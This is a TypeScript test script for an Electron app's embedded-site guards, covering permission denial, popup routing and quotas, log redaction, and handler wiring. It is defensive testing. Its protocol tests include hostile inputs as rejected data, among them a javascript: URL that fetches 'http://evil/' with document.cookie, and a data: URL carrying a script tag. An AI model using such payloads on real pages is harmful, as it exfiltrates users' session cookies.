/**
 * 内嵌站点的权限与弹窗闸门（纯函数 + 接线，不需要 Electron）
 *
 * 这一项没有「跑一遍看看」的轻量验证通道：装 handler 要在 Electron 里才生效，
 * 而「该不该放」的判断错一次就是静默的 —— 站点拿到麦克风不会有任何提示。
 * 所以能钉死的两层都钉：
 * - 纯函数层：URL 协议判定、三档弹窗归属、日志不得漏出整条 URL；
 * - 接线层：三道 handler 确实装在 web-contents-created 上、确实恒拒、
 *   确实登记了唯一的例外（登录窗口），且注册早于第一枚窗口。
 *
 * 运行：npm run test:webview-guards
 */

import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import {
  LOGIN_POPUP_BUDGET,
  claimInAppPopup,
  denyNote,
  isHttpUrl,
  isLoginWindow,
  loginPopupTitle,
  markLoginWindow,
  popupDisposition,
  popupNote,
  releaseLoginWindow,
  safeHost,
} from '../src/main/webview/guards'

const ROOT = path.resolve(__dirname, '..')

let pass = 0
let fail = 0

async function it(name: string, fn: () => Promise<void> | void): Promise<void> {
  try {
    await fn()
    pass++
    console.log(`  [PASS] ${name}`)
  } catch (e) {
    fail++
    console.log(`  [FAIL] ${name}`)
    console.log(`         ${(e as Error).message.split('\n').slice(0, 4).join('\n         ')}`)
  }
}

function readSrc(rel: string): string {
  return fs.readFileSync(path.join(ROOT, rel), 'utf8').replace(/\r\n/g, '\n')
}

async function main(): Promise<void> {
  console.log('='.repeat(46))
  console.log('  内嵌站点闸门：权限一律拒、弹窗不失控')
  console.log('='.repeat(46))

  await it('协议判定：只认 http(s)，解析不了的按不可信处理', () => {
    assert.equal(isHttpUrl('http://chatgpt.com/a'), true)
    assert.equal(isHttpUrl('https://deepseek.com'), true)
    assert.equal(isHttpUrl('HTTPS://BigModel.cn/x'), true, '协议大小写不该成为绕路')
    for (const bad of [
      'javascript:alert(1)',
      'data:text/html,<script>steal()</script>',
      'blob:https://x/8f0e',
      'file:///C:/Users/you/Desktop/x.html',
      'about:blank',
      '//evil.com/phish',
      '',
      '不是 URL',
    ]) {
      assert.equal(isHttpUrl(bad), false, `${bad} 不该被当成可打开的链接`)
    }
  })

  await it('弹窗分档：登录窗口放行到应用内，其余站点一律不占应用窗口', () => {
    const url = 'https://accounts.google.com/o/oauth2/auth'
    assert.equal(popupDisposition(url, { loginWindow: true }), 'in-app', 'OAuth 靠弹窗续接，一刀切就登不进去')
    assert.equal(popupDisposition(url, { loginWindow: false }), 'external', '聊天页里的链接不该长出第二枚 Torra 窗口')
  })

  await it('弹窗分档：非 http(s) 连系统浏览器都不给，且与是否登录窗口无关', () => {
    const poison = 'javascript:fetch("http://evil/"+document.cookie)'
    assert.equal(popupDisposition(poison, { loginWindow: false }), 'block')
    assert.equal(popupDisposition(poison, { loginWindow: true }), 'block', '登录窗口也不是免检牌')
    assert.equal(popupDisposition('', { loginWindow: true }), 'block')
  })

  await it('登录窗口例外是登记制的：没登记、已释放都不算', () => {
    assert.equal(isLoginWindow(4242), false, '没人登记的 id 不能默认放行')
    markLoginWindow(4242)
    assert.equal(isLoginWindow(4242), true)
    releaseLoginWindow(4242)
    assert.equal(isLoginWindow(4242), false, '窗口关了就该撤，例外不累积')
  })

  await it('额度：一枚登录窗口最多放行 LOGIN_POPUP_BUDGET 枚，之后不再是例外', () => {
    const id = 5100
    markLoginWindow(id)
    for (let i = 1; i <= LOGIN_POPUP_BUDGET; i++) {
      assert.equal(claimInAppPopup(id), i, `第 ${i} 枚该放行`)
    }
    assert.equal(claimInAppPopup(id), null, '第 3 枚必须没额度 —— 无限放行就是「站点能刷一串 Torra 窗口」')
    assert.equal(isLoginWindow(id), true, '额度用尽不等于取消登记：它仍是登录窗口，只是不再长窗口')
    releaseLoginWindow(id)
  })

  await it('额度：取用是按窗口计数的，未登记与释放后都取不到', () => {
    assert.equal(claimInAppPopup(5101), null, '没登记的 id 没有额度可用')
    markLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), 1)
    releaseLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), null)
    markLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), 1, '重新登记就是一枚新窗口，计数归零，不继承上一枚的用量')
    markLoginWindow(5102)
    assert.equal(claimInAppPopup(5102), 1, '一枚窗口用尽额度不该影响另一枚')
    releaseLoginWindow(5101)
    releaseLoginWindow(5102)
  })

  await it('额度与协议判定是两条独立的闸：非 http(s) 恒 block，额度不参与', () => {
    markLoginWindow(5103)
    const claim = claimInAppPopup(5103)
    assert.equal(claim, 1)
    assert.equal(popupDisposition('javascript:alert(1)', { loginWindow: claim !== null }), 'block')
    releaseLoginWindow(5103)
  })

  await it('窗口身份：弹窗标题由 Torra 说清楚，不靠站点自己的 <title>', () => {
    const t = loginPopupTitle(1)
    assert.match(t, /Torra 登录弹窗/, '用户要一眼认出这是 Torra 开的临时窗口')
    assert.match(t, /第 1 枚/, '第几枚要和额度对得上，用户才知道后续为什么走系统浏览器')
    assert.match(t, /临时窗口/, '要写明是登录用的、用完可关')
    assert.doesNotMatch(t, /[a-z]+\.[a-z]+\//i, '标题里不带目标站点路径 —— 那是仿冒页最爱伪装的部分')
    assert.notEqual(loginPopupTitle(2), loginPopupTitle(1), '序号要能区分，否则串窗了也看不出来')
  })

  await it('留痕：走外部时能说明「为什么不是应用内」，且不把整条 URL 抄进日志', () => {
    const note = popupNote('external', 'https://auth.example.com/o?code=SECRET', 'https://x.taobao.com/login', '登录弹窗额度已用尽')
    assert.match(note, /交系统浏览器/)
    assert.match(note, /登录弹窗额度已用尽/, '体检读这句才知道是被额度挡的，不是闸门出错')
    assert.doesNotMatch(note, /SECRET|\?code=/, '理由照旧只落固定措辞与主机名')
    const inApp = popupNote('in-app', 'https://login.doubao.com/oauth', 'https://doubao.com', undefined)
    assert.match(inApp, /放行到应用内：login\.doubao\.com/)
    assert.doesNotMatch(inApp, /（）|（undefined/, '没理由时不留空括号')
  })

  await it('日志只落主机名：整条 URL 不进诊断（那里面常带一次性 token）', () => {
    const src = 'https://chatgpt.com/c/1234?access_token=SECRET#frag'
    assert.equal(safeHost(src), 'chatgpt.com')
    assert.doesNotMatch(safeHost('不完整的'), /./, '解析不了就空串，别把原文抄进日志')
    const note = denyNote('media', src)
    assert.match(note, /^media 已拒绝/, '要看得见是哪个权限被拒')
    assert.match(note, /chatgpt\.com/)
    assert.doesNotMatch(note, /SECRET|access_token|1234/, '拒绝原因不能顺手把凭据写进日志')
  })

  await it('拒绝口径要说人话：写明是闸门拒的，不是站点坏了', () => {
    const note = denyNote('notifications', 'https://www.doubao.com/chat')
    assert.match(note, /不给内嵌站点任何权限/, '用户/体检读到这句就知道是被设计挡住的')
    assert.match(note, /doubao\.com/)
    assert.match(denyNote('geolocation', ''), /来源 未知页面/, '拿不到来源时也要有个明确说法')
  })

  await it('弹窗留痕：三档各有明确措辞，挡住的东西看得见', () => {
    assert.match(popupNote('in-app', 'https://auth.x.com/o', 'https://yuanbao.taobao.com/login'), /放行到应用内/)
    assert.match(popupNote('external', 'https://ref.example/a', 'https://chatgpt.com/c/1'), /交系统浏览器/)
    assert.match(popupNote('block', 'javascript:alert(1)', 'https://chatgpt.com/c/1'), /整体挡掉/)
    assert.match(popupNote('external', 'https://ref.example/a', ''), /应用页面/, '来源未知也要说清是谁发起的')
  })

  await it('接线：三道闸门装在 web-contents-created 上，每个 webContents 都过一遍', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)
    assert.ok(body, '找不到 hardenEmbeddedContents 的实现')
    const impl = body[1] ?? ''
    assert.match(impl, /setPermissionCheckHandler\(\(requester, permission\) => allowAppClipboard\(requester, permission\)\)/, '同步的权限自检也要走同一口径，否则放行只生效一半')
    assert.match(impl, /setPermissionRequestHandler/, '不装就是「自动批准一切权限请求」')
    assert.match(impl, /ses\.setPermissionCheckHandler/, '权限 handler 挂在 session 上，挂 webContents 是静默失效')
    assert.match(impl, /hardened\.has\(ses\)/, '同一分区重复注册会顶掉前一个闭包，来源就串了')
    assert.match(impl, /callback\(ok\)/)
    assert.doesNotMatch(impl, /callback\(true\)/, '没有第二档：除了 allowAppClipboard 那一条，不给任何按权限名放行的口子')
    assert.match(impl, /setWindowOpenHandler/, '默认行为是在应用内开子窗，且复用同一 persist: 分区')
    assert.match(impl, /return \{ action: 'deny' \}/)
    assert.match(impl, /shell\.openExternal\(url\)/)
    assert.match(main, /app\.on\('web-contents-created'/)
    assert.match(main, /from '.\/webview\/guards'/)
  })

  await it('剪贴板：闸门唯一的例外是自家界面，站点仍然一条不给', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function allowAppClipboard\([\s\S]*?\n\}/)
    assert.ok(body, '找不到 allowAppClipboard —— 剪贴板例外必须只有这一个判定点')
    const pred = body[0] ?? ''
    // 主窗口没有独立分区，和站点视图同处 defaultSession 的 handler 会把它一起锁死；
    // 一旦放行条件放宽（少一个 &&），就等于给内嵌站点开了写剪贴板的路
    assert.match(pred, /permission === 'clipboard-sanitized-write'/, '只放行写剪贴板这一条权限名')
    assert.match(pred, /requester === mainWindow\.webContents/, '按窗口身份判，不按 URL 判（file:// 与随机 dev 端口都要兼容）')
    assert.match(pred, /!!mainWindow/, '主窗口重建的空档期不能误放行')
    assert.doesNotMatch(pred, /includes\(|startsWith\(|hostname/, 'URL/字符串匹配会被伪装来源绕过')
    const impl = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)?.[1] ?? ''
    assert.match(impl, /const ok = allowAppClipboard\(requester, permission\)/, '两个 handler 必须共用同一谓词')
    assert.match(impl, /if \(ok\) return/, '放行不该留下 permission-deny 痕迹，否则体检里全是假拒绝')
  })

  await it('接线：闸门登记必须早于 whenReady，否则第一枚窗口带不上', () => {
    const main = readSrc('src/main/index.ts')
    const callAt = main.search(/^hardenEmbeddedContents\(\)$/m)
    const readyAt = main.indexOf('app.whenReady()')
    assert.ok(callAt > 0, '模块顶层要有一次调用，光有定义不生效')
    assert.ok(readyAt > callAt, `登记(${callAt})必须早于建窗(${readyAt})`)
  })

  await it('接线：只有登录窗口被登记为例外，关闭即撤销', () => {
    const pool = readSrc('src/main/webview/pool.ts')
    assert.match(pool, /const loginContentsId = login\.webContents\.id/, 'id 要在窗口还在时取')
    assert.match(pool, /markLoginWindow\(loginContentsId\)/)
    assert.match(pool, /login\.once\('closed', \(\) => releaseLoginWindow\(loginContentsId\)\)/, '不能留着一串失效 id')
    assert.match(pool, /import \{ markLoginWindow, releaseLoginWindow \} from '.\/guards'/)
    assert.doesNotMatch(pool, /markLoginWindow\(login\.webContents\.id\)/, '放进 closed 回调就读不到 id 了')
  })

  await it('接线：应用内放行要过额度这一道，窗口标题由 Torra 钉死', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)
    assert.ok(body, '找不到 hardenEmbeddedContents 的实现')
    const impl = body[1] ?? ''
    assert.match(impl, /isLoginWindow\(contents\.id\)\s*\?\s*claimInAppPopup\(contents\.id\)/, '登记与额度分两步：日志才分得清「不是登录窗口」和「额度用尽」')
    assert.match(impl, /loginWindow: claim !== null/, '额度用尽后就不能再自称登录例外')
    assert.match(impl, /if \(d === 'in-app' && claim !== null\)/, 'allow 必须挂在 claim 上，光靠档位判断会开出无名窗口')
    assert.match(impl, /did-create-window/, '子窗一造出来就登记身份，晚一步站点标题就抢到了')
    assert.match(impl, /child\.setTitle\(title\)/)
    assert.match(impl, /page-title-updated[\s\S]{0,80}preventDefault/, '挡住 <title>，否则 Torra 的窗口会被改名叫「元宝」')
    assert.match(impl, /overrideBrowserWindowOptions: \{ autoHideMenuBar: true, title \}/, '创建时就给 title：setTitle 之前那一瞬也是空档')
    assert.match(impl, /登录弹窗额度已用尽/, '走外部要写明原因，否则体检里看不出是额度挡的')
    assert.doesNotMatch(impl, /LOGIN_POPUP_BUDGET/, '数字只在 guards.ts 说了算，接线层不自己数')
    const guards = readSrc('src/main/webview/guards.ts')
    assert.match(guards, /export const LOGIN_POPUP_BUDGET = \d+/, '额度必须是可命名的常量，不是散在 if 里的魔法数')
    assert.match(guards, /slot\.used >= LOGIN_POPUP_BUDGET/)
  })

  /**
   * 回合中的轮询分两级：完成判定 + 增量探针按快拍跑，
   * 全量 read（mdOf 要走整棵回复子树）与 observe（要读 body.innerText）只在
   * 「探针说变了 / 到兜底窗口 / 站点说结束」时才发生。
   * 少一层，8 路并发就是每秒 10 次全量扫描；探针若去做 Markdown 化，等于没降级。
   */
  await it('轮询降级：快拍只问「有没有变」，全量读由它触发', () => {
    const agent = readSrc('src/main/agents/webview-agent.ts')
    const inject = readSrc('src/main/webview/inject.ts')
    assert.match(inject, /growth: function \(streamSel\)/, '页面侧要有增量探针')
    assert.match(inject, /String\(last\.textContent \|\| ''\)\.length/, '探针只量字符数：不许碰 mdOf 或 innerText')
    assert.doesNotMatch(inject, /growth: function[\s\S]{0,400}mdOf\(/, '探针一旦做 Markdown 化，降级就白做了')

    assert.match(agent, /const FAST_TICK_MS = \d+/, '快拍间隔要命名，不埋在 sleep 里')
    assert.match(agent, /const FULL_READ_MS = \d+/, '全量读的兜底窗口要命名')
    assert.match(agent, /window\.__torra\.growth\(\$\{streamSel\}\)/, '快拍必须真的问探针')
    assert.match(
      agent,
      /if \(!changed && !due && !quick\.complete\)[\s\S]{0,120}continue/,
      '静止期必须跳过全量读，只留一个 sleep 再进下一拍',
    )
    // 快档不能把完成判定省掉：settled 的三条降级判据（stop 按钮 / dom_stable / 文本静止）都靠它
    assert.match(agent, /const quick = [\s\S]{0,400}window\.__torra\.done\(/, '完成判定留在快拍')
    assert.match(agent, /await sleep\(FAST_TICK_MS\)\s*\n\s*\}\s*\n\s*this\.status/, '循环尾部的节拍必须是快拍间隔')
  })

  /**
   * 空闲实例的两件事必须真的接线：后台节流（markSuspended 曾全仓零调用点）
   * 与预算回收（预算按 9 枚网页模型估到 12 枚以上，LRU 那条路永远走不到）。
   * 反过来，两条老雷还得继续按住：预热不许被自己的回收杀掉，
   * 一轮生成中的实例不许被挂起或挤掉。
   */
  await it('空闲挂起与 LRU 回收都接上，且不误伤预热与在跑的轮次', () => {
    const pool = readSrc('src/main/webview/pool.ts')
    const agent = readSrc('src/main/agents/webview-agent.ts')
    const boot = readSrc('src/main/index.ts')

    assert.match(pool, /startIdleSweeper\(intervalMs = [\d_]+, idleMs = [\d_ *]+, busy: \(\) => boolean = \(\) => false\)/, '清扫要有周期、空闲阈值，以及「现在能不能挤人」的口径')
    assert.match(pool, /this\.sweeper = setInterval\(\(\) => this\.sweepIdle\(idleMs, !busy\(\)\), intervalMs\)/)
    assert.match(pool, /this\.sweeper\.unref\?\.\(\)/, '清扫不该单独把进程留在世上')
    assert.match(pool, /if \(canEvict\) this\.enforceMemoryBudget\(\)/, '回收要过闸门，挂起不过')
    assert.match(boot, /pool\.startIdleSweeper\(undefined, undefined, \(\) => discussionActive\)/, '周期清扫要在建池之后真的开起来，且讨论中不挤人')
    assert.match(pool, /clearInterval\(this\.sweeper\)/, 'disposeAll 要把定时器一起收掉')

    // 预算要低到「一场满员讨论装不下」，LRU 才有机会触发
    assert.match(pool, /export const DEFAULT_MEMORY_BUDGET_MB = (\d+)/)
    const budget = Number(/export const DEFAULT_MEMORY_BUDGET_MB = (\d+)/.exec(pool)?.[1])
    const mb = Number(/export const MB_PER_WEBVIEW = (\d+)/.exec(pool)?.[1])
    assert.ok(budget / mb <= 8, `预算折合 ${Math.round((budget / mb) * 10) / 10} 枚，满员讨论根本碰不到回收线`)

    assert.match(agent, /this\.pool\.markSuspended\(this\.id, false\)/, '发言开始时解除挂起')
    assert.match(agent, /this\.pool\.setBusy\(this\.id, true\)/, '这一轮把实例占住')
    assert.match(agent, /finally \{[\s\S]{0,120}this\.pool\.setBusy\(this\.id, false\)/, '出错出口也要放行实例')

    // 两条保护：attached（用户正在看）与 busy（生成在跑）都不许挂起/回收
    assert.match(pool, /if \(suspended && \(e\.attached \|\| e\.busy \|\| e\.view\.webContents\.isLoading\(\)\)\) return/)
    assert.match(pool, /if \(e\.busy\) continue/, 'LRU 名单要跳过在跑的实例')
    // 预热不许自杀：ensure() 里不再当场查预算
    const ensure = pool.slice(pool.indexOf('ensure(modelId'), pool.indexOf('\n  }', pool.indexOf('ensure(modelId')))
    assert.doesNotMatch(ensure, /this\.enforceMemoryBudget\(\)/, '创建后立刻回收 = 预热循环杀自己')
  })

  /**
   * 注入的幂等判据必须是「文档里是我们这一版」，不是「有没有人占了 __torra 这个名字」。
   * 旧的 `!!window.__torra` 把两类失效一路带到文档卸载：站点自己先定义了 __torra
   * （我们什么都不注入，之后每一处 window.__torra.read() 调的都是别人的实现），
   * 以及应用更新后存活的旧视图里留着上一版脚本（选择器口径与完成判定跟主进程对不上）。
   * 两类都表现为「这个模型说得奇怪」，而不是「注入没生效」——最难查的那种。
   */
  await it('注入身份：认标记不认名字，标记不对就重新覆盖', () => {
    const inject = readSrc('src/main/webview/inject.ts')
    const agent = readSrc('src/main/agents/webview-agent.ts')
    const doctor = readSrc('src/main/diagnostics/doctor.ts')

    assert.match(inject, /export const INJECT_BUILD = '[^']+'/, '标记要导出，主进程侧才能同一来源')
    assert.match(inject, /var __BUILD = '\$\{INJECT_BUILD\}';/, '脚本内用同变量，不留两处字面量')
    assert.match(
      inject,
      /if \(window\.__torra && window\.__torra\.__build === __BUILD\) return;/,
      '幂等只认自己那份；裸 !!window.__torra 会把站点的实现当成已注入',
    )
    assert.match(inject, /__build: __BUILD,/, '发布出来的对象要带标记')
    assert.doesNotMatch(inject, /if \(window\.__torra\) return;/, '不许退回裸名字判定')

    assert.match(agent, /window\.__torra\.__build === \$\{JSON\.stringify\(INJECT_BUILD\)\}/, '入口检查比对标记')
    assert.doesNotMatch(agent, /executeJavaScript\('!!window\.__torra'/, '不许再只判存在')
    // 中途重注入会换掉页面侧留存的键入节点与 __torraHold，所以只在动作入口查
    const ensure = agent.slice(agent.indexOf('private async ensureInjected'), agent.indexOf('\n  }', agent.indexOf('private async ensureInjected')))
    assert.equal((ensure.match(/executeJavaScript/g) ?? []).length, 2, '入口一次判定 + 一次注入，不在轮询里反复覆盖')

    assert.match(doctor, /window\.__torra\.__build === \$\{JSON\.stringify\(INJECT_BUILD\)\}/, '诊断报的也是身份，不只是名字')
  })

  await it('用例本身挂在 npm test 链上，不是一跑而过就没人看的孤儿', () => {
    const pkg = JSON.parse(readSrc('package.json')) as { scripts: Record<string, string> }
    assert.equal(pkg.scripts['test:webview-guards'].includes('scripts/test-webview-guards.ts'), true)
    assert.match(pkg.scripts.test, /run-tests/, 'npm test 必须走 scripts/run-tests.js 汇总跑法')
    assert.ok(!pkg.scripts.test.includes('&&'), '回到 && 串链：首处失败会遮蔽后面的套件')
  })

  console.log('-'.repeat(46))
  console.log(`  通过 ${pass} · 失败 ${fail}`)
  console.log('='.repeat(46))
  if (fail > 0) process.exit(1)
}

void main()
